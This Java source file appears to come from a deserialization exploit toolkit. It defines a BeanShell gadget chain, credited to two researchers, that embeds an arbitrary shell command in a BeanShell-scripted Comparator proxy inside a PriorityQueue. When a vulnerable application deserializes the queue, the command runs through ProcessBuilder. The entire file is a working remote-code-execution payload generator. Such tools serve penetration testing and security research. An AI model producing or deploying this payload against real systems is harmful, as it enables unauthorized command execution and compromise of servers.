package payloads;

import bsh.Interpreter;
import bsh.XThis;
import common.Strings;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;
import util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.beanshell:bsh:2.0b5" })
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
	// BeanShell payload

        String payload =
            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                Strings.join( // does not support spaces in quotes
                    Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                    ",", "\"", "\"") +
                "}).start();return new Integer(1);}";

	// Create Interpreter
	Interpreter i = new Interpreter();

	// Evaluate payload
	i.eval(payload);

	// Create InvocationHandler
	XThis xt = new XThis(i.getNameSpace(), i);
	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

	// Create Comparator Proxy
	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	Object[] queue = new Object[] {1,1};
	Reflections.setFieldValue(priorityQueue, "queue", queue);
	Reflections.setFieldValue(priorityQueue, "size", 2);

	return priorityQueue;
    }

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(BeanShell1.class, command, fusion);
	}
}
